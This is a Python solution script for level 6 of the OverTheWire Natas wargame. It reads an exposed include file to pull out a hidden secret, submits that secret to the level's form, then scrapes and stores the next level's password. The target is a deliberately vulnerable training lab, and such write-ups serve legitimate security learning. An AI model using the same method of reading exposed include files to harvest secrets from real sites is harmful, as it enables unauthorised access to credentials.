import natas,re,requests,base64

USER='natas6'
PASSWORD = natas.get_credential(USER)
URL='http://natas6.natas.labs.overthewire.org'
SECRET_URL = '/includes/secret.inc'

def main():
    b64 = base64.b64encode('%s:%s' % (USER, PASSWORD))
    secret = get_secret(b64)

    response = requests.post(
            URL,
            data={
                'secret':secret,
                'submit':'Submit+Query'
            },
            headers={
                'Authorization':'Basic %s' % b64
            }
    )

    regex=r"The password for natas7 is (\w+)$"
    matches = re.finditer(regex, response.content, re.MULTILINE)

    password = None
    for match in matches:
        password = match.group(1)

    if password is not None:
        print('found password: %s' % password)
        print('adding to credentials file')
        natas.save_credentials('natas7',password)
        print('done')


"""
retrieve the secret from the SECRET_URL
"""
def get_secret(b64):
    response = requests.get(
            '%s%s' % (URL, SECRET_URL),
            headers = {
                'Authorization':'Basic %s' % b64
            }
    )

    regex = "^\\$secret = \\\"(\w+)\\\";"
    matches = re.finditer(regex,response.content,re.MULTILINE)

    for match in matches:
        return match.group(1)

    return None

if __name__=='__main__':
    main()
